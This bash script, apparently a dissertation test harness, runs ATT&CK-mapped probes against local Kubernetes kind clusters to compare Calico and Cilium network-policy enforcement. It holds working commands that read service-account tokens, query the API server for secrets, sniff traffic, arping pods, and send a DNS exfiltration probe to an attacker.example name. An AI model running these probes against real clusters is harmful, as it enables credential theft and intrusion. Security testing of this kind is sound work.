#!/bin/bash
# =============================================================================
# DISSERTATION ATTACK TEST SUITE — 25 TECHNIQUES
# Title: Security Challenges in Container Orchestration
# Student: Sagarkumar Bhaveshbhai Bhikadiya | ID: 24051080
# Module: CT7P01
#
# Usage: ./attack-test-suite.sh <cluster-context> <phase>
#   cluster-context : kind-calico-cluster OR kind-cilium-cluster
#   phase           : phase1 | phase2 | phase3
#
# Phase 1 = Baseline (zero NetworkPolicies — everything should be ALLOWED)
# Phase 2 = Default-deny enforcement (attacks should be BLOCKED)
# Phase 3 = CNI bypass attempts (tests enforcement gaps between Calico/Cilium)
#
# Output: ./results/<context>-<phase>-<timestamp>.txt  (human readable report)
#         ./results/<context>-<phase>-<timestamp>.csv  (ATT&CK Coverage Matrix)
#
# Tests 1-17  : Core network and credential attack techniques
# Tests 18-25 : Extended techniques targeting CNI-specific weaknesses
# Bypass B1-B4: CNI enforcement gap tests (Phase 3 only)
# =============================================================================

set -uo pipefail

# --- Argument Validation -----------------------------------------------------
if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <cluster-context> <phase>"
  echo "  cluster-context: kind-calico-cluster OR kind-cilium-cluster"
  echo "  phase: phase1 | phase2 | phase3"
  exit 1
fi

CTX="$1"
PHASE="$2"
NAMESPACE="default"
ATTACKER_POD="attacker-netshoot"
ATTACKER_IMAGE="nicolaka/netshoot"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
RESULTS_DIR="./results"
mkdir -p "$RESULTS_DIR"
REPORT_FILE="${RESULTS_DIR}/${CTX}-${PHASE}-${TIMESTAMP}.txt"
CSV_FILE="${RESULTS_DIR}/${CTX}-${PHASE}-${TIMESTAMP}.csv"

# Determine CNI name for display
if echo "$CTX" | grep -q "calico"; then
  CNI_NAME="Calico (iptables)"
else
  CNI_NAME="Cilium (eBPF)"
fi

# --- Counters ----------------------------------------------------------------
TOTAL=0
ALLOWED=0
BLOCKED=0
ERRORS=0

# --- Helper Functions --------------------------------------------------------

log() {
  echo "$1" | tee -a "$REPORT_FILE"
}

init_csv() {
  echo "TechniqueID,TechniqueName,Tactic,Cluster,CNI,Phase,Result,Detail,Timestamp" > "$CSV_FILE"
}

# record_result <tech_id> <tech_name> <tactic> <result> <detail>
record_result() {
  local TECH_ID="$1"
  local TECH_NAME="$2"
  local TACTIC="$3"
  local RESULT="$4"
  local DETAIL="$5"

  TOTAL=$((TOTAL + 1))
  if [[ "$RESULT" == "ALLOWED" ]]; then
    ALLOWED=$((ALLOWED + 1))
    local SYMBOL="[ALLOWED]"
  elif [[ "$RESULT" == "BLOCKED" ]]; then
    BLOCKED=$((BLOCKED + 1))
    local SYMBOL="[BLOCKED]"
  else
    ERRORS=$((ERRORS + 1))
    local SYMBOL="[ERROR]  "
  fi

  log "  ${SYMBOL} ${TECH_ID} | ${TECH_NAME}"
  log "           Detail: ${DETAIL}"
  log ""
  echo "\"${TECH_ID}\",\"${TECH_NAME}\",\"${TACTIC}\",\"${CTX}\",\"${CNI_NAME}\",\"${PHASE}\",\"${RESULT}\",\"${DETAIL}\",\"${TIMESTAMP}\"" >> "$CSV_FILE"
}

# Run a command inside the attacker pod
exec_attack() {
  local CMD="$1"
  kubectl exec "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
    -- sh -c "$CMD" 2>/dev/null
  return $?
}

# Test TCP connectivity — returns 0 if open, 1 if blocked
test_tcp() {
  local HOST="$1"
  local PORT="$2"
  local TIMEOUT="${3:-3}"
  kubectl exec "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
    -- sh -c "nc -z -w${TIMEOUT} ${HOST} ${PORT}" 2>/dev/null
  return $?
}

# --- Deploy Attacker Pod -----------------------------------------------------
deploy_attacker() {
  log ""
  log "[SETUP] Checking attacker pod..."

  if kubectl get pod "$ATTACKER_POD" -n "$NAMESPACE" --context "$CTX" \
      --no-headers 2>/dev/null | grep -q "Running"; then
    log "[SETUP] Attacker pod already running. Reusing."
    return 0
  fi

  log "[SETUP] Deploying attacker pod: ${ATTACKER_IMAGE}"

  kubectl run "$ATTACKER_POD" \
    --image="$ATTACKER_IMAGE" \
    --restart=Never \
    --context "$CTX" \
    -n "$NAMESPACE" \
    --overrides='{
      "spec": {
        "containers": [{
          "name": "attacker-netshoot",
          "image": "nicolaka/netshoot",
          "command": ["sleep", "86400"],
          "securityContext": {
            "capabilities": {
              "add": ["NET_ADMIN", "NET_RAW"]
            }
          }
        }]
      }
    }' 2>/dev/null || true

  log "[SETUP] Waiting for attacker pod to be Running..."
  kubectl wait pod "$ATTACKER_POD" \
    -n "$NAMESPACE" \
    --context "$CTX" \
    --for=condition=Ready \
    --timeout=90s 2>/dev/null

  log "[SETUP] Attacker pod is Ready."
}

# --- Resolve Service ClusterIPs ----------------------------------------------
get_service_ips() {
  FRONTEND_IP=$(kubectl get svc frontend -n "$NAMESPACE" --context "$CTX" \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "unknown")
  REDIS_IP=$(kubectl get svc redis-cart -n "$NAMESPACE" --context "$CTX" \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "unknown")
  API_SERVER_IP=$(kubectl get svc kubernetes -n default --context "$CTX" \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "unknown")
}

# Shared service map used across multiple tests
declare_services() {
  SVC_NAMES=("frontend" "cartservice" "redis-cart" "checkoutservice" "paymentservice"
             "productcatalogservice" "recommendationservice" "shippingservice"
             "currencyservice" "emailservice" "adservice")
  SVC_PORTS=("80" "7070" "6379" "5050" "50051" "3550" "8080" "50051" "7000" "5000" "9555")
}

# =============================================================================
# ALL 25 ATTACK TESTS — called by both phase1 and phase2
# Phase 1: expects ALLOWED. Phase 2: expects BLOCKED.
# =============================================================================
run_all_tests() {
  declare_services

  # Read SA token once — reused across multiple tests
  SA_TOKEN=$(exec_attack "cat /var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null || echo "")

  # ===========================================================================
  # TEST 1 — T1190 | Initial Access: Exploit Public-Facing Application
  # frontend:80 requires no authentication — any pod can browse the full store
  # ===========================================================================
  log "--- T1190 | Initial Access: Exploit Public-Facing Application ---"
  HTTP_CODE=$(exec_attack "curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 http://frontend.${NAMESPACE}.svc.cluster.local:80/" 2>/dev/null || echo "000")
  if [[ "$HTTP_CODE" =~ ^(200|301|302|404)$ ]]; then
    record_result "T1190" "Exploit Public-Facing Application" "Initial Access" \
      "ALLOWED" "HTTP ${HTTP_CODE} from frontend:80 — full app accessible with no credentials"
  else
    record_result "T1190" "Exploit Public-Facing Application" "Initial Access" \
      "BLOCKED" "HTTP ${HTTP_CODE} — frontend unreachable from attacker pod"
  fi

  # ===========================================================================
  # TEST 2 — T1613 | Discovery: Container and Resource Discovery
  # Stolen SA token used to query the Kubernetes API for the full pod list
  # ===========================================================================
  log "--- T1613 | Discovery: Container and Resource Discovery ---"
  DISC_OUT=$(exec_attack "curl -sk -H 'Authorization: Bearer ${SA_TOKEN}' \
    https://kubernetes.default.svc.cluster.local/api/v1/namespaces/${NAMESPACE}/pods" 2>/dev/null || echo "")
  if echo "$DISC_OUT" | grep -q '"items"'; then
    record_result "T1613" "Container and Resource Discovery" "Discovery" \
      "ALLOWED" "Full pod list retrieved via Kubernetes API using auto-mounted SA token"
  else
    record_result "T1613" "Container and Resource Discovery" "Discovery" \
      "BLOCKED" "API server returned no pod list — RBAC or NetworkPolicy blocking"
  fi

  # ===========================================================================
  # TEST 3 — T1046 | Discovery: Network Service Scanning
  # TCP port scan against all 11 microservice ClusterIPs
  # ===========================================================================
  log "--- T1046 | Discovery: Network Service Scanning ---"
  SCAN_OPEN=0; SCAN_CLOSED=0
  for i in "${!SVC_NAMES[@]}"; do
    SVC="${SVC_NAMES[$i]}"; PORT="${SVC_PORTS[$i]}"
    if test_tcp "${SVC}.${NAMESPACE}.svc.cluster.local" "$PORT" 3; then
      SCAN_OPEN=$((SCAN_OPEN + 1))
    else
      SCAN_CLOSED=$((SCAN_CLOSED + 1))
    fi
  done
  if [[ $SCAN_OPEN -gt 0 ]]; then
    record_result "T1046" "Network Service Scanning" "Discovery" \
      "ALLOWED" "${SCAN_OPEN}/11 service ports open to attacker pod — full service map discoverable"
  else
    record_result "T1046" "Network Service Scanning" "Discovery" \
      "BLOCKED" "0/11 ports reachable — default-deny blocking all service discovery"
  fi

  # ===========================================================================
  # TEST 4 — T1210 | Lateral Movement: Exploitation of Remote Services (Redis)
  # redis-cart runs with zero authentication — attacker reads live cart data
  # ===========================================================================
  log "--- T1210 | Lateral Movement: Redis Unauthenticated Access ---"
  REDIS_PING=$(exec_attack "printf 'PING\r\n' | nc -w3 redis-cart.${NAMESPACE}.svc.cluster.local 6379" 2>/dev/null || echo "")
  if echo "$REDIS_PING" | grep -qi "PONG"; then
    record_result "T1210" "Exploitation of Remote Services (Redis)" "Lateral Movement" \
      "ALLOWED" "Redis PING returned PONG — unauthenticated read/write access to live cart database"
  elif test_tcp "redis-cart.${NAMESPACE}.svc.cluster.local" "6379" 3; then
    record_result "T1210" "Exploitation of Remote Services (Redis)" "Lateral Movement" \
      "ALLOWED" "Redis TCP:6379 reachable — unauthenticated database port exposed to all pods"
  else
    record_result "T1210" "Exploitation of Remote Services (Redis)" "Lateral Movement" \
      "BLOCKED" "redis-cart:6379 unreachable — NetworkPolicy protecting database"
  fi

  # ===========================================================================
  # TEST 5 — T1021.004 | Lateral Movement: Remote Services (all microservices)
  # Direct TCP connection to every microservice — tests full east-west isolation
  # ===========================================================================
  log "--- T1021.004 | Lateral Movement: Remote Services (all 11 pods) ---"
  LAT_OPEN=0; LAT_BLOCKED_COUNT=0
  for i in "${!SVC_NAMES[@]}"; do
    SVC="${SVC_NAMES[$i]}"; PORT="${SVC_PORTS[$i]}"
    if test_tcp "${SVC}.${NAMESPACE}.svc.cluster.local" "$PORT" 3; then
      LAT_OPEN=$((LAT_OPEN + 1))
    else
      LAT_BLOCKED_COUNT=$((LAT_BLOCKED_COUNT + 1))
    fi
  done
  if [[ $LAT_OPEN -gt 0 ]]; then
    record_result "T1021.004" "Remote Services — Lateral Movement" "Lateral Movement" \
      "ALLOWED" "${LAT_OPEN}/11 lateral paths open — attacker can reach internal microservices directly"
  else
    record_result "T1021.004" "Remote Services — Lateral Movement" "Lateral Movement" \
      "BLOCKED" "0/11 lateral paths — full east-west isolation achieved by CNI"
  fi

  # ===========================================================================
  # TEST 6 — T1552.007 | Credential Access: Container API (read SA token)
  # Every pod has a service account token auto-mounted — readable by any process
  # ===========================================================================
  log "--- T1552.007 | Credential Access: Container API Credentials (SA Token) ---"
  TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
  TOKEN_OUT=$(exec_attack "cat ${TOKEN_PATH}" 2>/dev/null || echo "")
  if [[ ${#TOKEN_OUT} -gt 20 ]]; then
    record_result "T1552.007" "Container API Credentials (SA Token Read)" "Credential Access" \
      "ALLOWED" "SA token readable at ${TOKEN_PATH} — token prefix: ${TOKEN_OUT:0:40}..."
  else
    record_result "T1552.007" "Container API Credentials (SA Token Read)" "Credential Access" \
      "BLOCKED" "SA token not accessible — automountServiceAccountToken disabled or path protected"
  fi

  # ===========================================================================
  # TEST 7 — T1552.007b | Credential Access: Use SA token against API server
  # Stolen token used to query secrets endpoint — tests RBAC + network policy
  # ===========================================================================
  log "--- T1552.007b | Credential Access: API Server Secrets via Token ---"
  SECRET_OUT=$(exec_attack "curl -sk -H 'Authorization: Bearer ${SA_TOKEN}' \
    https://kubernetes.default.svc.cluster.local/api/v1/namespaces/${NAMESPACE}/secrets" 2>/dev/null || echo "")
  if echo "$SECRET_OUT" | grep -q '"items"'; then
    record_result "T1552.007" "API Server Secrets via Service Account Token" "Credential Access" \
      "ALLOWED" "Secrets endpoint returned data — SA token grants cluster secret read access"
  else
    record_result "T1552.007" "API Server Secrets via Service Account Token" "Credential Access" \
      "BLOCKED" "Secrets endpoint denied — RBAC or NetworkPolicy blocking API server access"
  fi

  # ===========================================================================
  # TEST 8 — T1552.004 | Credential Access: Credentials in Environment Variables
  # Kubernetes injects every ClusterIP/port as env vars — 100+ exposed per pod
  # ===========================================================================
  log "--- T1552.004 | Credential Access: Credentials in Environment Variables ---"
  ENV_OUT=$(exec_attack "env" 2>/dev/null | grep -cE "SERVICE_HOST|SERVICE_PORT|REDIS|PAYMENT|CHECKOUT" || echo "0")
  ENV_COUNT=$(echo "$ENV_OUT" | tr -d ' \n')
  if [[ "$ENV_COUNT" -gt 0 ]] 2>/dev/null; then
    record_result "T1552.004" "Credentials in Environment Variables" "Credential Access" \
      "ALLOWED" "${ENV_COUNT} service connection strings exposed as env vars — all ClusterIPs/ports visible"
  else
    record_result "T1552.004" "Credentials in Environment Variables" "Credential Access" \
      "BLOCKED" "No sensitive environment variables found"
  fi

  # ===========================================================================
  # TEST 9 — T1005 | Collection: Data from Local System (Redis cart dump)
  # Read live user session data directly from Redis with zero auth
  # ===========================================================================
  log "--- T1005 | Collection: Data from Redis (live cart sessions) ---"
  DBSIZE=$(exec_attack "printf 'DBSIZE\r\n' | nc -w3 redis-cart.${NAMESPACE}.svc.cluster.local 6379 2>/dev/null" 2>/dev/null || echo "")
  if echo "$DBSIZE" | grep -qE "^:[0-9]"; then
    KEY_COUNT=$(echo "$DBSIZE" | grep -oE "[0-9]+" | head -1)
    record_result "T1005" "Data from Local System (Redis Session Dump)" "Collection" \
      "ALLOWED" "Redis DBSIZE returned ${KEY_COUNT} keys — live user cart data accessible without credentials"
  elif test_tcp "redis-cart.${NAMESPACE}.svc.cluster.local" "6379" 3; then
    record_result "T1005" "Data from Local System (Redis Session Dump)" "Collection" \
      "ALLOWED" "Redis TCP reachable — data collection path open, RESP protocol parsing limited by tooling"
  else
    record_result "T1005" "Data from Local System (Redis Session Dump)" "Collection" \
      "BLOCKED" "Redis unreachable — cannot collect session data"
  fi

  # ===========================================================================
  # TEST 10 — T1609 | Execution: Container Administration Command
  # Attempt kubectl exec into another pod using the stolen SA token
  # ===========================================================================
  log "--- T1609 | Execution: Container Administration Command (kubectl exec) ---"
  EXEC_OUT=$(exec_attack "curl -sk -H 'Authorization: Bearer ${SA_TOKEN}' \
    'https://kubernetes.default.svc.cluster.local/api/v1/namespaces/${NAMESPACE}/pods'" 2>/dev/null || echo "")
  if echo "$EXEC_OUT" | grep -q '"items"'; then
    record_result "T1609" "Container Administration Command" "Execution" \
      "ALLOWED" "Pod list accessible via API — exec paths available to attacker via kubectl"
  else
    record_result "T1609" "Container Administration Command" "Execution" \
      "BLOCKED" "API server denied pod list — exec path unavailable"
  fi

  # ===========================================================================
  # TEST 11 — T1611 | Privilege Escalation: Escape to Host
  # Read host filesystem via /proc/1/root — works if pod has elevated capabilities
  # ===========================================================================
  log "--- T1611 | Privilege Escalation: Escape to Host ---"
  HOST_READ=$(exec_attack "ls /proc/1/root/etc/ 2>/dev/null | head -3" 2>/dev/null || echo "")
  if [[ -n "$HOST_READ" ]]; then
    record_result "T1611" "Escape to Host (Host Filesystem Access)" "Privilege Escalation" \
      "ALLOWED" "Host /etc/ visible via /proc/1/root — container has elevated host access: $(echo $HOST_READ | tr '\n' ' ')"
  else
    record_result "T1611" "Escape to Host (Host Filesystem Access)" "Privilege Escalation" \
      "BLOCKED" "Host filesystem not accessible — container isolation intact"
  fi

  # ===========================================================================
  # TEST 12 — T1562.001 | Defense Evasion: Disable or Modify Tools (iptables)
  # Read iptables rules from inside pod — attacker can see CNI enforcement rules
  # Calico writes iptables rules to host; Cilium uses eBPF maps instead
  # ===========================================================================
  log "--- T1562.001 | Defense Evasion: Read/Modify iptables Rules ---"
  IPT_OUT=$(exec_attack "iptables -L INPUT --line-numbers 2>&1 | head -5" 2>/dev/null || echo "")
  if echo "$IPT_OUT" | grep -qi "Chain\|target\|policy"; then
    rule_count=$(exec_attack "iptables -L 2>/dev/null | grep -c '^ACCEPT\|^DROP\|^REJECT'" 2>/dev/null || echo "0")
    record_result "T1562.001" "Disable or Modify Tools (iptables)" "Defense Evasion" \
      "ALLOWED" "iptables rules visible from inside pod (${rule_count} rules) — CNI enforcement rules exposed to attacker"
  else
    record_result "T1562.001" "Disable or Modify Tools (iptables)" "Defense Evasion" \
      "BLOCKED" "iptables not accessible — NET_ADMIN capability restricted"
  fi

  # ===========================================================================
  # TEST 13 — T1048 | Exfiltration: Exfiltration Over Alternative Protocol
  # Test outbound DNS to external resolver — if this works, data can leave cluster
  # ===========================================================================
  log "--- T1048 | Exfiltration: Exfiltration Over Alternative Protocol ---"
  DNS_OUT=$(exec_attack "nslookup test.attacker.example 8.8.8.8 2>&1" 2>/dev/null || echo "")
  if echo "$DNS_OUT" | grep -qiE "Server:|NXDOMAIN|address"; then
    record_result "T1048" "Exfiltration Over Alternative Protocol (DNS)" "Exfiltration" \
      "ALLOWED" "External DNS query reached 8.8.8.8 — egress unrestricted, DNS exfiltration path open"
  else
    NC_OUT=$(exec_attack "nc -z -w3 8.8.8.8 53 2>&1" 2>/dev/null || echo "")
    if echo "$NC_OUT" | grep -qi "open\|succeeded"; then
      record_result "T1048" "Exfiltration Over Alternative Protocol (DNS)" "Exfiltration" \
        "ALLOWED" "UDP/TCP port 53 to 8.8.8.8 reachable — external DNS egress path exists"
    else
      record_result "T1048" "Exfiltration Over Alternative Protocol (DNS)" "Exfiltration" \
        "BLOCKED" "External DNS and port 53 blocked — egress filtering active"
    fi
  fi

  # ===========================================================================
  # TEST 14 — T1489 | Impact: Service Stop (pod deletion via API)
  # Dry-run deletion — tests whether SA token grants destructive API permissions
  # ===========================================================================
  log "--- T1489 | Impact: Service Stop (pod deletion via API) ---"
  if [[ -n "$SA_TOKEN" ]]; then
    TARGET_POD=$(kubectl get pods -n "$NAMESPACE" --context "$CTX" \
      --no-headers 2>/dev/null | grep "loadgenerator" | awk '{print $1}' | head -1)
    if [[ -n "$TARGET_POD" ]]; then
      DEL_OUT=$(exec_attack "curl -sk -X DELETE \
        -H 'Authorization: Bearer ${SA_TOKEN}' \
        -H 'Content-Type: application/json' \
        'https://kubernetes.default.svc.cluster.local/api/v1/namespaces/${NAMESPACE}/pods/${TARGET_POD}?dryRun=All'" \
        2>/dev/null || echo "")
      if echo "$DEL_OUT" | grep -q '"kind":"Pod"'; then
        record_result "T1489" "Service Stop (Pod Deletion via API)" "Impact" \
          "ALLOWED" "Dry-run deletion accepted — SA token has pod delete permissions"
      else
        record_result "T1489" "Service Stop (Pod Deletion via API)" "Impact" \
          "BLOCKED" "Deletion denied — RBAC preventing destructive operations"
      fi
    else
      record_result "T1489" "Service Stop (Pod Deletion via API)" "Impact" \
        "ERROR" "No target pod found for deletion test"
    fi
  else
    record_result "T1489" "Service Stop (Pod Deletion via API)" "Impact" \
      "ERROR" "No SA token available"
  fi

  # ===========================================================================
  # TEST 15 — T1499 | Impact: Endpoint Denial of Service
  # Rapid request flood to frontend — tests absence of inter-pod rate limiting
  # ===========================================================================
  log "--- T1499 | Impact: Endpoint Denial of Service ---"
  DOS_OK=0
  for i in $(seq 1 10); do
    CODE=$(exec_attack "curl -s -o /dev/null -w '%{http_code}' --connect-timeout 2 \
      http://frontend.${NAMESPACE}.svc.cluster.local:80/" 2>/dev/null || echo "000")
    if [[ "$CODE" =~ ^(200|301|302|404)$ ]]; then
      DOS_OK=$((DOS_OK + 1))
    fi
  done
  if [[ $DOS_OK -gt 5 ]]; then
    record_result "T1499" "Endpoint Denial of Service" "Impact" \
      "ALLOWED" "${DOS_OK}/10 rapid requests reached frontend — no inter-pod rate limiting enforced"
  else
    record_result "T1499" "Endpoint Denial of Service" "Impact" \
      "BLOCKED" "${DOS_OK}/10 requests reached target — rate limiting or NetworkPolicy active"
  fi

  # ===========================================================================
  # TEST 16 — T1610 | Execution: Deploy Container (via API)
  # Attempt to create a new pod using stolen SA token — dry-run safe
  # ===========================================================================
  log "--- T1610 | Execution: Deploy Container via Kubernetes API ---"
  if [[ -n "$SA_TOKEN" ]]; then
    PAYLOAD='{"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil-pod","namespace":"'"${NAMESPACE}"'"},"spec":{"containers":[{"name":"evil","image":"busybox","command":["sleep","10"]}]}}'
    DEPLOY_OUT=$(exec_attack "curl -sk -X POST \
      -H 'Authorization: Bearer ${SA_TOKEN}' \
      -H 'Content-Type: application/json' \
      -d '${PAYLOAD}' \
      'https://kubernetes.default.svc.cluster.local/api/v1/namespaces/${NAMESPACE}/pods?dryRun=All'" \
      2>/dev/null || echo "")
    kubectl delete pod evil-pod -n "$NAMESPACE" --context "$CTX" \
      --ignore-not-found=true 2>/dev/null || true
    if echo "$DEPLOY_OUT" | grep -q '"kind":"Pod"'; then
      record_result "T1610" "Deploy Container via API" "Execution" \
        "ALLOWED" "Pod creation dry-run accepted — SA token has pod create permissions"
    else
      record_result "T1610" "Deploy Container via API" "Execution" \
        "BLOCKED" "Pod creation denied — RBAC preventing workload deployment"
    fi
  else
    record_result "T1610" "Deploy Container via API" "Execution" \
      "ERROR" "No SA token available"
  fi

  # ===========================================================================
  # TEST 17 — T1059.013 | Execution: Container CLI/API (kubectl inside pod)
  # Use kubectl from inside the attacker pod using the mounted SA credentials
  # ===========================================================================
  log "--- T1059.013 | Execution: Container CLI/API (kubectl inside pod) ---"
  KUBECTL_OUT=$(exec_attack "kubectl get pods -n ${NAMESPACE} \
    --server=https://kubernetes.default.svc.cluster.local \
    --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
    --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --no-headers 2>/dev/null | head -3" 2>/dev/null || echo "")
  if echo "$KUBECTL_OUT" | grep -qE "Running|Pending|Error"; then
    record_result "T1059.013" "Container CLI/API (kubectl inside pod)" "Execution" \
      "ALLOWED" "kubectl enumerated cluster pods from inside attacker pod using mounted credentials"
  else
    record_result "T1059.013" "Container CLI/API (kubectl inside pod)" "Execution" \
      "BLOCKED" "kubectl failed — API server unreachable or RBAC denied"
  fi

  # ===========================================================================
  # TEST 18 — T1040 | Credential Access: Network Sniffing
  # Run tcpdump inside pod — iptables cannot prevent packet capture.
  # Cilium's eBPF can detect this via Hubble. Calico cannot.
  # This test reveals an observability gap between the two CNIs.
  # ===========================================================================
  log "--- T1040 | Credential Access: Network Sniffing (tcpdump) ---"
  TCPDUMP_OUT=$(exec_attack "timeout 5 tcpdump -i eth0 -c 5 -nn 2>&1 | head -8" 2>/dev/null || echo "")
  if echo "$TCPDUMP_OUT" | grep -qiE "IP |ARP|listening|captured"; then
    PACKET_COUNT=$(echo "$TCPDUMP_OUT" | grep -oE "[0-9]+ packets captured" | grep -oE "[0-9]+" || echo "some")
    record_result "T1040" "Network Sniffing (tcpdump)" "Credential Access" \
      "ALLOWED" "tcpdump captured live packets on eth0 — ${PACKET_COUNT} packets visible. NOTE: NetworkPolicy cannot prevent sniffing; only encryption (mTLS) mitigates this"
  else
    record_result "T1040" "Network Sniffing (tcpdump)" "Credential Access" \
      "BLOCKED" "tcpdump failed — NET_RAW capability not available or interface restricted"
  fi

  # ===========================================================================
  # TEST 19 — T1018 | Discovery: Remote System Discovery (ICMP ping sweep)
  # ICMP is not covered by Kubernetes NetworkPolicy by default.
  # A default-deny policy blocks TCP/UDP but may leave ICMP open.
  # This is a known gap — Calico requires explicit ICMP deny rules.
  # Cilium's eBPF handles ICMP natively in its policy model.
  # ===========================================================================
  log "--- T1018 | Discovery: Remote System Discovery (ICMP sweep) ---"
  # Determine pod CIDR from the cluster
  POD_CIDR=$(kubectl get nodes --context "$CTX" -o jsonpath='{.items[0].spec.podCIDR}' 2>/dev/null || echo "10.244.0.0/24")
  # Ping the first 10 IPs in the pod CIDR
  CIDR_BASE=$(echo "$POD_CIDR" | cut -d'/' -f1 | cut -d'.' -f1-3)
  PING_OK=0
  for OCTET in 1 2 3 4 5 6 7 8 9 10; do
    TARGET_IP="${CIDR_BASE}.${OCTET}"
    if exec_attack "ping -c1 -W1 ${TARGET_IP} >/dev/null 2>&1"; then
      PING_OK=$((PING_OK + 1))
    fi
  done
  if [[ $PING_OK -gt 0 ]]; then
    record_result "T1018" "Remote System Discovery (ICMP Ping Sweep)" "Discovery" \
      "ALLOWED" "${PING_OK}/10 ICMP pings responded — NetworkPolicy does not filter ICMP by default, pod CIDR discoverable"
  else
    record_result "T1018" "Remote System Discovery (ICMP Ping Sweep)" "Discovery" \
      "BLOCKED" "0/10 ICMP pings responded — CNI blocking ICMP or no hosts in range"
  fi

  # ===========================================================================
  # TEST 20 — T1049 | Discovery: System Network Connections Discovery
  # Read /proc/net/tcp to enumerate all active TCP connections from inside pod.
  # This is a filesystem read — no network required — NetworkPolicy cannot block it.
  # Reveals all connection state: which pods are talking to which IPs on which ports.
  # ===========================================================================
  log "--- T1049 | Discovery: System Network Connections Discovery ---"
  PROC_TCP=$(exec_attack "cat /proc/net/tcp 2>/dev/null | wc -l" 2>/dev/null || echo "0")
  PROC_TCP=$(echo "$PROC_TCP" | tr -d ' \n')
  CONN_SAMPLE=$(exec_attack "cat /proc/net/tcp 2>/dev/null | head -5" 2>/dev/null || echo "")
  if [[ "$PROC_TCP" -gt 1 ]] 2>/dev/null; then
    record_result "T1049" "System Network Connections Discovery (/proc/net/tcp)" "Discovery" \
      "ALLOWED" "${PROC_TCP} TCP connection entries in /proc/net/tcp — active connection map readable. NOTE: This is a filesystem read; NetworkPolicy cannot block it"
  else
    record_result "T1049" "System Network Connections Discovery (/proc/net/tcp)" "Discovery" \
      "BLOCKED" "/proc/net/tcp not readable or empty — procfs restricted"
  fi

  # ===========================================================================
  # TEST 21 — T1083 | Discovery: File and Directory Discovery
  # Enumerate all mounted secret files, configmaps, and SA credentials in pod.
  # These are mounted by kubelet — present regardless of NetworkPolicy.
  # ===========================================================================
  log "--- T1083 | Discovery: File and Directory Discovery (secrets/configmaps) ---"
  SECRET_FILES=$(exec_attack "find /var/run/secrets /etc/ssl /run/secrets 2>/dev/null | wc -l" 2>/dev/null || echo "0")
  SECRET_FILES=$(echo "$SECRET_FILES" | tr -d ' \n')
  MOUNT_LIST=$(exec_attack "mount 2>/dev/null | grep -cE 'secret|configmap|projected'" 2>/dev/null || echo "0")
  MOUNT_LIST=$(echo "$MOUNT_LIST" | tr -d ' \n')
  if [[ "$SECRET_FILES" -gt 3 ]] 2>/dev/null; then
    record_result "T1083" "File and Directory Discovery (Secrets/Mounts)" "Discovery" \
      "ALLOWED" "${SECRET_FILES} files found in secret paths, ${MOUNT_LIST} secret mounts — CA cert, SA token, namespace all readable. NOTE: Filesystem; NetworkPolicy cannot block"
  else
    record_result "T1083" "File and Directory Discovery (Secrets/Mounts)" "Discovery" \
      "BLOCKED" "No secret files found — mounts restricted or paths not present"
  fi

  # ===========================================================================
  # TEST 22 — T1557.002 | Credential Access: ARP Cache Poisoning
  # Attempt ARP spoofing on the pod network — tests L2 isolation.
  # KIND uses Linux bridge networking. Pods on the same node share a bridge.
  # Calico relies on iptables (L3+) — ARP operates at L2 below iptables.
  # Cilium can detect ARP anomalies via eBPF at the XDP layer.
  # ===========================================================================
  log "--- T1557.002 | Credential Access: ARP Cache Poisoning ---"
  # Read current ARP table first — if we can see other pods, L2 is shared
  ARP_OUT=$(exec_attack "arp -n 2>/dev/null | grep -v 'Address\|incomplete'" 2>/dev/null || echo "")
  ARP_COUNT=$(echo "$ARP_OUT" | grep -c "[0-9]\{1,3\}\." 2>/dev/null || echo "0")
  # Try to send a gratuitous ARP (requires NET_RAW)
  ARPING_OUT=$(exec_attack "arping -c2 -I eth0 ${FRONTEND_IP} 2>&1 | head -4" 2>/dev/null || echo "")
  if echo "$ARPING_OUT" | grep -qiE "Unicast|bytes from|response"; then
    record_result "T1557.002" "ARP Cache Poisoning (L2 ARP Spoofing)" "Credential Access" \
      "ALLOWED" "ARP replies received from ${FRONTEND_IP} — L2 adjacency confirmed. ARP table shows ${ARP_COUNT} entries. Gratuitous ARP possible: NetworkPolicy does not operate at L2"
  elif [[ "$ARP_COUNT" -gt 0 ]]; then
    record_result "T1557.002" "ARP Cache Poisoning (L2 ARP Spoofing)" "Credential Access" \
      "ALLOWED" "ARP table populated with ${ARP_COUNT} pod entries — L2 visibility exists. Full ARP spoofing requires same-node placement"
  else
    record_result "T1557.002" "ARP Cache Poisoning (L2 ARP Spoofing)" "Credential Access" \
      "BLOCKED" "No ARP responses and empty ARP table — L2 isolation enforced or arping not available"
  fi

  # ===========================================================================
  # TEST 23 — T1530 | Collection: Data from Cloud Storage (metadata endpoint)
  # Attempt to reach the cloud instance metadata service at 169.254.169.254.
  # In cloud environments this returns IAM credentials, SSH keys, and user-data.
  # In KIND on bare metal this should be unreachable — but tests egress filtering.
  # ===========================================================================
  log "--- T1530 | Collection: Data from Cloud Storage (metadata endpoint) ---"
  META_OUT=$(exec_attack "curl -s --connect-timeout 3 -o /dev/null -w '%{http_code}' \
    http://169.254.169.254/latest/meta-data/" 2>/dev/null || echo "000")
  if [[ "$META_OUT" =~ ^(200|301|302|401|403)$ ]]; then
    record_result "T1530" "Data from Cloud Storage (Metadata Endpoint)" "Collection" \
      "ALLOWED" "HTTP ${META_OUT} from 169.254.169.254 — instance metadata endpoint reachable. In cloud clusters this exposes IAM credentials"
  else
    # Also check if the link-local range is even routable
    LINK_LOCAL=$(exec_attack "nc -z -w2 169.254.169.254 80 2>&1" 2>/dev/null || echo "")
    if echo "$LINK_LOCAL" | grep -qi "open\|succeeded"; then
      record_result "T1530" "Data from Cloud Storage (Metadata Endpoint)" "Collection" \
        "ALLOWED" "TCP to 169.254.169.254:80 succeeded — link-local metadata range reachable"
    else
      record_result "T1530" "Data from Cloud Storage (Metadata Endpoint)" "Collection" \
